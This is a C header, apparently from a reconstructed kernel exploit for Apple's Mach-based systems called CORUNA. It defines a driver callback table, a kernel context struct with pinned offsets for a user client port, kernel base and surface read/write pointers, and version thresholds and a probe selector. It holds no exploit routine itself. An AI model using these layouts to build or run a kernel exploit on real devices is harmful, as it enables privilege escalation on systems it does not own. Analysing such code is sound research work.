/*
 * Kernel exploit dylib types and offset accessors (0x1d60 inner context).
 */
#ifndef CORUNA_KERNEL_H
#define CORUNA_KERNEL_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <mach/mach.h>

#define CORUNA_MAGIC             0x20002u
#define DRIVER_CTX_SIZE           0x50
#define KERNEL_CTX_SIZE           0x1d60

#define VER_0x158_PATH_A_THRESH  0x1f543c40800000ULL
#define VER_0x140_PROBE_THRESH   0x2257u
#define KIO_RETURN_UNSUPPORTED   0xe00002c7u
#define PROBE_SELECTOR           999u

#define SURF_READ_PTR_OLD        0xc0
#define SURF_READ_PTR_NEW        0x448
#define SURF_WRITE_PTR_OLD       0x360
#define SURF_WRITE_PTR_NEW       0x368

#define KC_U64(k, off)  (*(uint64_t *)((uint8_t *)(k) + (off)))
#define KC_U32(k, off)  (*(uint32_t *)((uint8_t *)(k) + (off)))
#define KC_P64(k, off)  (*(uint64_t **)((uint8_t *)(k) + (off)))

typedef struct coruna_driver {
    uint32_t          magic;
    uint32_t          _pad0;
    void            (*cleanup)(void *self);
    void           *(*get_task)(void *self, int which, void **out);
    void            (*free_mem)(void *self, void *p);
    void            (*read_chunk)(void *self, void *t, uint32_t a, uint64_t v);
    void            (*unmap)(void *self, void *t);
    void            (*get_size)(void *self, void *t, int *out);
    void            (*read)(void *self, void **t, void *buf, uint32_t n, uint32_t fl);
    void            (*info)(void *self, size_t *out);
} coruna_driver_t;

_Static_assert(offsetof(coruna_driver_t, cleanup)    == 0x10, "cb0");
_Static_assert(offsetof(coruna_driver_t, get_task)   == 0x18, "cb1");
_Static_assert(offsetof(coruna_driver_t, free_mem)  == 0x20, "cb2");
_Static_assert(offsetof(coruna_driver_t, read_chunk)== 0x28, "cb3");
_Static_assert(offsetof(coruna_driver_t, unmap)     == 0x30, "cb4");
_Static_assert(offsetof(coruna_driver_t, get_size)  == 0x38, "cb5");
_Static_assert(offsetof(coruna_driver_t, read)      == 0x40, "cb6");
_Static_assert(offsetof(coruna_driver_t, info)     == 0x48, "cb7");
_Static_assert(sizeof(coruna_driver_t) == DRIVER_CTX_SIZE, "driver size");

typedef struct coruna_kernel {
    uint8_t           pad_000[0xe8];
    mach_port_t       user_client;
    uint64_t          kbase;
    uint8_t          *mapped_obj;
    uint64_t          mapped_size;
    uint64_t          mapped_off;
    uint32_t          scalar_0x110;
    mach_port_t       mem_entry;
    uint8_t           pad_118[0x140 - 0x118];
    uint32_t          ver_0x140;
    uint8_t           pad_144[0x158 - 0x144];
    uint64_t          ver_0x158;
    uint32_t          elem_size;
    uint8_t           pad_16c[0x188 - 0x16c];
    uint64_t          align_mask;
    uint8_t           pad_190[0x18a0 - 0x190];
    uint32_t          range_count;
    uint8_t           pad_18a4[0x1918 - 0x18a4];
    int               size_field_0x1918;
    uint8_t           pad_191c[0x19d0 - 0x191c];
    uint64_t          store_0x19d0;
    uint8_t           pad_19d8[0x1a18 - 0x19d8];
    const uint64_t   *range_table;
    uint8_t           tail[0x1d60 - 0x1a20];
} coruna_kernel_t;

_Static_assert(offsetof(coruna_kernel_t, user_client)  == 0xe8,  "kc e8");
_Static_assert(offsetof(coruna_kernel_t, kbase)      == 0xf0,  "kc f0");
_Static_assert(offsetof(coruna_kernel_t, mapped_obj) == 0xf8,  "kc f8");
_Static_assert(offsetof(coruna_kernel_t, mapped_size)== 0x100, "kc 100");
_Static_assert(offsetof(coruna_kernel_t, mapped_off) == 0x108, "kc 108");
_Static_assert(offsetof(coruna_kernel_t, scalar_0x110)== 0x110, "kc 110");
_Static_assert(offsetof(coruna_kernel_t, mem_entry)  == 0x114, "kc 114");
_Static_assert(offsetof(coruna_kernel_t, ver_0x140) == 0x140, "kc 140");
_Static_assert(offsetof(coruna_kernel_t, ver_0x158) == 0x158, "kc 158");
_Static_assert(offsetof(coruna_kernel_t, elem_size)  == 0x168, "kc 168");
_Static_assert(offsetof(coruna_kernel_t, align_mask) == 0x188, "kc 188");
_Static_assert(offsetof(coruna_kernel_t, range_count) == 0x18a0, "kc 18a0");
_Static_assert(offsetof(coruna_kernel_t, size_field_0x1918) == 0x1918, "kc 1918");
_Static_assert(offsetof(coruna_kernel_t, store_0x19d0) == 0x19d0, "kc 19d0");
_Static_assert(offsetof(coruna_kernel_t, range_table) == 0x1a18, "kc 1a18");
_Static_assert(sizeof(coruna_kernel_t) == KERNEL_CTX_SIZE, "kernel size");

#endif /* CORUNA_KERNEL_H */
